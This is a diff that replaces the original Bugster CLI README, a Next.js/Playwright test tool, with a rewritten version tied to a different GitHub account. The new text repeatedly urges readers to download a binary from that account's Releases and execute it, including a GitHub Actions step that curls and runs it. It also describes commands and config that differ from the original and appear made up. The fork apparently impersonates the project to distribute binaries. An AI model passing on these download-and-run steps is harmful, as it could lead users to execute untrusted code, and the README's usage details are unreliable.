@@ -1,341 +1,258 @@
-# Bugster CLI
+Bugster CLI — AI UI Testing for Next.js with Playwright
+[![Releases](https://img.shields.io/github/v/release/abrarahmed110/bugster-cli?label=Releases&style=for-the-badge&color=4c1)](https://github.com/abrarahmed110/bugster-cli/releases)
 
-![release version](https://img.shields.io/github/v/release/Bugsterapp/bugster-cli?color=green)
+[![ai-testing](https://img.shields.io/badge/ai--testing-blue?style=flat-square)](https://github.com/topics/ai-testing)
+[![automation](https://img.shields.io/badge/automation-yes-green?style=flat-square)](https://github.com/topics/automation)
+[![cli-tool](https://img.shields.io/badge/cli--tool-lightgrey?style=flat-square)](https://github.com/topics/cli-tool)
+[![debugging](https://img.shields.io/badge/debugging-orange?style=flat-square)](https://github.com/topics/debugging)
+[![e2e-testing](https://img.shields.io/badge/e2e--testing-darkblue?style=flat-square)](https://github.com/topics/e2e-testing)
+[![nextjs](https://img.shields.io/badge/next.js-black?style=flat-square&logo=next.js)](https://nextjs.org/)
+[![playwright](https://img.shields.io/badge/playwright-282c34?style=flat-square&logo=playwright)](https://playwright.dev/)
+[![ui-testing](https://img.shields.io/badge/ui--testing-purple?style=flat-square)](https://github.com/topics/ui-testing)
+[![vercel](https://img.shields.io/badge/vercel-000000?style=flat-square&logo=vercel)](https://vercel.com/)
+[![vibe-testing](https://img.shields.io/badge/vibe--testing-9cf?style=flat-square)](https://github.com/topics/vibe-testing)
 
-🐛 **Bugster Agent - Simple Browser testing**
+Hero image  
+![Playwright + Next.js + Vercel](https://playwright.dev/img/playwright-logo.svg)
 
-Bugster CLI generate comprehensive test specs for your web applications and keep them synchronized across your team. Minimal setup.
+Table of contents
+- Overview
+- Key features
+- Quickstart (download & run)
+- Install (binaries, npm, Docker)
+- Usage (commands and examples)
+- Config (project and CI)
+- Integrations (Playwright, Next.js, Vercel)
+- Debugging & logs
+- Advanced patterns
+- Contributing
+- License
+- Releases
 
-## Table of Contents
+Overview
+Bugster CLI helps you test UIs with a clear, scriptable interface. Use it to run end-to-end tests, capture visual diffs, and automate checks in CI. It integrates with Playwright and Next.js, and it works well when you deploy with Vercel. Use it to run repeatable tests on PRs and to debug UI regressions with trace and snapshot output.
 
-- [Features](#features)
-- [Installation](#installation)
-- [Quick Start](#quick-start)
-- [Commands](#commands)
-- [Configuration](#configuration)
-- [Examples](#examples)
-- [Contributing](#contributing)
-- [License](#license)
+Key features
+- E2E test runner that wraps Playwright flows.
+- Visual snapshot capture and pixel-diff reports.
+- AI-assisted test suggestion and selector hints.
+- CLI-first workflow for local debug and CI runs.
+- Native binary for Linux, macOS, Windows (download from Releases).
+- Built-in report generator (HTML) for test runs.
+- Support for Next.js static and server paths.
+- Integrations: Playwright reporters, Vercel deploy previews.
 
-## Features
+Quickstart (download & run)
+Go to the Releases page and download the binary for your OS:
+https://github.com/abrarahmed110/bugster-cli/releases
 
-✨ **AI-Powered Test Generation**: Automatically analyze your codebase and generate comprehensive test specs  
-🎯 **Intelligent Updates**: Automatically update test specs when your code changes  
-🚀 **Cross-Platform**: Works on Windows, macOS, and Linux  
-🌐 **Framework Support**: Currently supports Next.js applications  
-📊 **Dashboard Integration**: Stream results to the Bugster dashboard for team visibility
+Download the matching asset for your platform (for example: bugster-cli-linux, bugster-cli-macos, bugster-cli-win.exe). Make the binary executable and run it.
 
-## Installation
-
-### Automated Installation (Recommended)
-
-Our installers automatically check for and install dependencies (Node.js 18+, Playwright).
-
-#### macOS/Linux
-
+Example (macOS / Linux)
 ```bash
-curl -sSL https://github.com/Bugsterapp/bugster-cli/releases/latest/download/install.sh | bash -s -- -y
+# download the binary from Releases, then:
+chmod +x bugster-cli-macos
+./bugster-cli-macos init
+./bugster-cli-macos run --target=https://my-next-app.vercel.app
 ```
 
-#### Windows
+Example (Windows)
+- Download bugster-cli-win.exe from the Releases page.
+- Run the executable:
+```powershell
+.\bugster-cli-win.exe run --target=https://my-next-app.vercel.app
+```
 
-1. Download [install.bat](https://github.com/Bugsterapp/bugster-cli/releases/latest/download/install.bat)
-2. Right-click and select "Run as administrator"
+Install
+Binaries (recommended for CI and local runs)
+- Visit the Releases page and download the binary that matches your OS and architecture.
+- Make the binary executable and place it on PATH or invoke it directly.
+- The downloaded file needs to be executed to run the CLI.
 
-## Quick Start
+NPM (if packaged)
+If a Node package is available, install:
+```bash
+npm i -g bugster-cli
+# or
+npx bugster-cli run --target=https://your-app
+```
 
-1. **Initialize your project**
+Docker
+You can run bugster in a container that contains browsers and Playwright dependencies.
+```bash
+docker run --rm -v $(pwd):/work -w /work ghcr.io/abrarahmed110/bugster-cli:latest bugster run --target=https://your-app
+```
 
-   ```bash
-   bugster init
-   ```
+Usage
+Commands follow a simple verb-noun structure.
 
-2. **Generate test cases**
-
-   ```bash
-   bugster generate
-   ```
-
-3. **Run your tests**
-
-   ```bash
-   bugster run
-   ```
-
-4. **Keep tests up to date**
-   ```bash
-   bugster update
-   ```
-
-## Commands
-
-### `bugster init`
-
-Initialize Bugster CLI configuration in your project. Sets up authentication, project settings, and test credentials.
-
+Init
+Create a project config and baseline snapshot directory.
 ```bash
 bugster init
+# creates bugster.config.json and snapshots/
 ```
 
-### `bugster generate`
-
-Analyze your codebase and generate AI-powered test specs. This command scans your application structure and creates comprehensive test cases.
-
+Run
+Run tests against a target URL or local server.
 ```bash
-bugster generate [options]
-
-Options:
-  -f, --force        Force analysis even if already completed
-  --show-logs        Show detailed logs during analysis
+bugster run --target=https://staging.myapp.com --headless
 ```
 
-### `bugster run`
-
-Execute your Bugster tests with various options for different environments.
-
+Record
+Record a new test flow. This starts a Playwright session and saves actions as a script.
 ```bash
-bugster run [path] [options]
-
-Arguments:
-  path               Path to test file or directory (optional)
-
-Options:
-  --headless         Run tests in headless mode
-  --silent           Run in silent mode (less verbose output)
-  --stream-results   Stream test results to dashboard
-  --output FILE      Save test results to JSON file
-  --base-url URL     Override base URL for testing
-  --only-affected    Only run tests affected by recent changes
-  --max-concurrent N Maximum concurrent tests (up to 5)
-  --verbose          Show detailed execution logs
+bugster record --out=test-flows/login.flow.json
 ```
 
-**Examples:**
-
+Compare
+Run visual diffs against stored snapshots.
 ```bash
-# Run all tests
-bugster run
-
-# Run tests in a specific directory
-bugster run auth/
-
-# Run with custom configuration
-bugster run --headless --stream-results
-
-# Run only tests affected by code changes
-bugster run --only-affected
+bugster compare --snapshots=./snapshots --target=https://preview.myapp.com
 ```
 
-### `bugster update`
-
-Update your test specs when your codebase changes. Intelligently detects modifications and updates relevant tests.
-
+Report
+Generate HTML report.
 ```bash
-bugster update [options]
-
-Options:
-  --update-only      Only update existing specs
-  --suggest-only     Only suggest new specs
-  --delete-only      Only delete obsolete specs
-  --show-logs        Show detailed logs during analysis
+bugster report --input=results.json --output=report/
+open report/index.html
 ```
 
-### `bugster sync`
+Common flags
+- --target: URL to test
+- --headless / --headed: run browsers headless or visible
+- --browser: chromium | firefox | webkit
+- --concurrency: number of parallel sessions
+- --trace: capture Playwright trace
+- --snapshots: snapshot directory
 
-Synchronize test cases with your team across different branches and environments.
-
-```bash
-bugster sync [options]
-
-Options:
-  --branch BRANCH    Branch to sync with (defaults to current)
-  --pull             Only pull specs from remote
-  --push             Only push specs to remote
-  --clean-remote     Delete remote specs that don't exist locally
-  --dry-run          Show what would happen without making changes
-  --prefer OPTION    Prefer 'local' or 'remote' when resolving conflicts
+Config (bugster.config.json)
+A sample config:
+```json
+{
+  "project": "my-next-app",
+  "baseUrl": "http://localhost:3000",
+  "browsers": ["chromium", "webkit"],
+  "snapshotDir": "snapshots",
+  "reportDir": "bugster-report",
+  "concurrency": 2
+}
 ```
+Key fields
+- baseUrl: local dev server URL.
+- snapshotDir: where baseline images live.
+- reportDir: HTML and JSON output.
+- concurrency: parallel workers for E2E tests.
 
-**Examples:**
+Integrations
 
-```bash
-# Sync with main branch
-bugster sync --branch main
+Playwright
+Bugster uses Playwright under the hood. You get playwright features: tracing, network intercepts, and browser contexts. Use Playwright selectors in your flows and scripts.
 
-# Only download remote changes
-bugster sync --pull
+Next.js
+Use bugster to run tests against dev, build, and preview URLs. You can configure Next.js static routes and API routes in bugster.config.json.
 
-# Preview sync changes
-bugster sync --dry-run
-```
+Vercel
+Run bugster against Vercel preview URLs to validate pull requests. Pair bugster runs with Vercel deployments to gate UI regressions.
 
-### `bugster issues`
-
-Get debugging information about failed test runs from recent executions.
-
-```bash
-bugster issues [options]
-
-Options:
-  --history          Get issues from the last week
-  --save             Save issues to .bugster/issues directory
-```
-
-### `bugster upgrade`
-
-Update Bugster CLI to the latest version.
-
-```bash
-bugster upgrade [options]
-
-Options:
-  -y, --yes          Automatically confirm the upgrade
-```
-
-## Configuration
-
-Bugster CLI uses a YAML configuration file located at `.bugster/config.yaml`:
-
+CI / GitHub Actions
+Add a job to run tests on PRs. Example snippet:
 ```yaml
-project_name: "My App"
-project_id: "my-app-123456"
-base_url: "http://localhost:3000"
-credentials:
-  - id: "admin"
-    username: "admin"
-    password: "admin"
-x-vercel-protection-bypass: "optional-bypass-key"
+name: Bugster E2E
+on: [pull_request]
+jobs:
+  e2e:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - name: Download bugster
+        run: |
+          curl -L -o bugster-cli-linux https://github.com/abrarahmed110/bugster-cli/releases/download/latest/bugster-cli-linux
+          chmod +x ./bugster-cli-linux
+      - name: Run tests
+        run: |
+          ./bugster-cli-linux run --target=https://preview.myapp.vercel.app --headless --reportDir=./report
+      - name: Upload report
+        uses: actions/upload-artifact@v3
+        with:
+          name: bugster-report
+          path: report/
 ```
+Note: Replace the download asset name with the exact asset you need from Releases.
 
-### Authentication
+Debugging & logs
+- Use --trace to collect Playwright trace files. Open traces with Playwright trace viewer.
+- Use --verbose to get detailed stdout logs.
+- Set LOG_LEVEL=debug to increase internal logger output.
 
-Set up your API key to connect with the Bugster platform:
+Common troubleshooting
+- If browsers fail to launch, confirm you use the correct binary for your OS and that dependencies exist. Use the Docker image for consistent environments.
+- If snapshots mismatch, run bugster update to rebase baselines when the change is intentional.
+- If CI fails on headless runs, test locally with --headed to reproduce.
 
+Advanced patterns
+
+Parallel runs
+Increase concurrency for larger suites. Watch for shared state and external API rate limits.
+
+Selective snapshots
+Tag pages and run compare only on affected snapshots:
 ```bash
-bugster auth
+bugster compare --filter="login,checkout"
 ```
 
-This will guide you through:
+AI test suggestions
+Use the ai-suggest command to get suggested flows and selectors. It uses a model to propose actions and selectors. Review suggestions before committing them to baseline.
 
-1. Opening the Bugster dashboard
-2. Copying your API key
-3. Configuring authentication locally
+Record-replay-debug
+- Record a flow with bugster record.
+- Replay with bugster run --flow=path.
+- If a replay fails, run with --trace and open the trace viewer.
 
-## Examples
+Examples
 
-### Basic Workflow
-
+End-to-end login test
+1. Start your Next.js dev server.
+2. Record a login flow:
 ```bash
-# 1. Set up your project
-bugster init
-
-# 2. Generate test cases from your codebase
-bugster generate
-
-# 3. Run all tests
-bugster run
-
-# 4. Run specific tests with streaming
-bugster run auth/ --stream-results
+bugster record --out=flows/login.json --target=http://localhost:3000
 ```
-
-### CI/CD Integration
-
+3. Run it in CI:
 ```bash
-# Run tests in CI environment
-bugster run \
-  --headless \
-  --stream-results \
-  --base-url $PREVIEW_URL \
-  --output results.json
+bugster run --flow=flows/login.json --reportDir=reports/login
 ```
 
-### Team Collaboration
-
+Visual regression on PRs
+1. Deploy PR to Vercel preview.
+2. Run bugster compare against the preview URL.
+3. Fail the job if diffs exceed threshold:
 ```bash
-# Pull latest test changes from team
-bugster sync --pull
-
-# Update tests after code changes
-bugster update
-
-# Push updated tests to team
-bugster sync --push
+bugster compare --target=https://pr-123.myapp.vercel.app --threshold=0.02
 ```
 
-### Advanced Usage
+Contributing
+- Fork the repo.
+- Create a feature branch.
+- Add tests for new logic.
+- Open a pull request with description and test output.
 
-```bash
-# Run only tests affected by recent changes
-bugster run --only-affected --max-concurrent 3
+Issue reporting
+Open an issue with:
+- Steps to reproduce
+- Platform and OS
+- Command used
+- Log output (attach report folder)
 
-# Generate test cases with debugging
-bugster generate --force --show-logs
+Design notes
+- CLI aims for small surface area and clear commands.
+- Outputs use JSON for CI and HTML for human review.
+- Tests remain Playwright-first for browser fidelity.
 
-# Sync with conflict resolution
-bugster sync --prefer local --dry-run
-```
+License
+This project uses the MIT license. See LICENSE for details.
 
-## Project Structure
+Releases
+Download the binary asset that matches your OS from the Releases page and execute it:
+https://github.com/abrarahmed110/bugster-cli/releases
 
-After initialization, Bugster creates the following structure:
-
-```
-.bugster/
-├── config.yaml          # Project configuration
-├── tests/               # Generated test specifications
-│   ├── auth/           # Feature-based test organization
-│   │   ├── 1_login.yaml
-│   │   └── 2_signup.yaml
-│   └── dashboard/
-│       └── 1_overview.yaml
-├── results/            # Test execution results
-├── videos/             # Test recordings (when enabled)
-└── logs/              # Execution logs
-```
-
-## Supported Frameworks
-
-- ✅ **Next.js**: Full support for both App Router and Pages Router
-- 🚧 **React**: Coming soon
-- 🚧 **Vue.js**: Coming soon
-
-## Test Limits
-
-Bugster CLI applies intelligent test limits to ensure efficient execution:
-
-- **Free tier**: Up to 5 tests per execution
-- **Distribution**: Tests are distributed across feature folders
-- **Selection**: Representative tests are chosen using smart algorithms
-
-## Requirements
-
-- **Node.js**: 18 or higher
-- **Operating System**: Windows 10+, macOS 10.15+, or Linux
-- **Browser**: Chrome/Chromium (automatically installed via Playwright)
-
-## Contributing
-
-We welcome contributions! Please see our [Contributing Guide](CONTRIBUTING.md) for details.
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## Support
-
-- 📚 **Documentation**: [docs.bugster.dev](https://docs.bugster.dev)
-- 🌐 **Dashboard**: [app.bugster.dev](https://app.bugster.dev)
-- 🐙 **GitHub**: [github.com/Bugsterapp/bugster-cli](https://github.com/Bugsterapp/bugster-cli)
-- 💬 **Issues**: [GitHub Issues](https://github.com/Bugsterapp/bugster-cli/issues)
-
----
-
-<div align="center">
-  <p>Built with ❤️ by Bugster</p>
-  <p>
-    <a href="https://app.bugster.dev">Dashboard</a> •
-    <a href="https://docs.bugster.dev">Documentation</a> •
-    <a href="https://github.com/Bugsterapp/bugster-cli">GitHub</a>
-  </p>
-</div>
+If you prefer a package manager or container, check the Releases page for published assets, checksums, and release notes. If a link fails, check the Releases section on the repository for the latest artifacts and release instructions.
